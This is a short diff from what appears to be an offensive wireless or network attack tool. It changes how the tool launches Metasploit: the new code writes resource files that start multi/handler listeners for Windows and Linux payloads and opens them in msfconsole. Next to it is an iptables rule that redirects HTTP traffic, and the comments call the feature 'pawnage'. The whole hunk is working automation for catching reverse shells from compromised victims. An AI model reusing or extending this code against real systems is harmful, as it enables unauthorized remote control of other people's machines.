@@ -1824,14 +1824,32 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
             self.metasploit_object.start()                               # Starts the Payload creation thread
 
             # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- WINDOWS
-            windows_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Windows)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
-            windows_console_string = windows_metapsloit_string % (windows_payload,ip_address,str(port_setting))
+            if(os.path.exists("/tmp/windows.rc")):
+                os.remove("/tmp/windows.rc")
 
+            windows_resource_object = open("/tmp/windows.rc","a+")
+            windows_resource_object.write("use multi/handler\n")
+            windows_resource_object.write("set payload %s\n" % (windows_payload))
+            windows_resource_object.write("set LHOST %s\n" % (ip_address))
+            windows_resource_object.write("set LPORT %s\n" % (str(port_setting)))
+            windows_resource_object.write("exploit -j\n")
+            windows_resource_object.close()
+
+            windows_console_string = '''xterm -geometry 100 -T "Metasploit (Windows)" -e "msfconsole -r /tmp/windows.rc"'''
 
             # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- LINUX
-            linux_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Linux)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
-            linux_console_string = linux_metapsloit_string % (linux_payload,ip_address,str(int(port_setting) + 1))
+            if(os.path.exists("/tmp/linux.rc")):
+                os.remove("/tmp/linux.rc")
 
+            linux_resource_object = open("/tmp/linux.rc","a+")
+            linux_resource_object.write("use multi/handler\n")
+            linux_resource_object.write("set payload %s\n" % (linux_payload))
+            linux_resource_object.write("set LHOST %s\n" % (ip_address))
+            linux_resource_object.write("set LPORT %s\n" % (str(int(port_setting) + 1)))
+            linux_resource_object.write("exploit -j\n")
+            linux_resource_object.close()
+
+            linux_console_string = '''xterm -geometry 100 -T "Metasploit (Linux)" -e "msfconsole -r /tmp/linux.rc"'''
 
             if self.respond_to_all_radio.isChecked():
                 subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
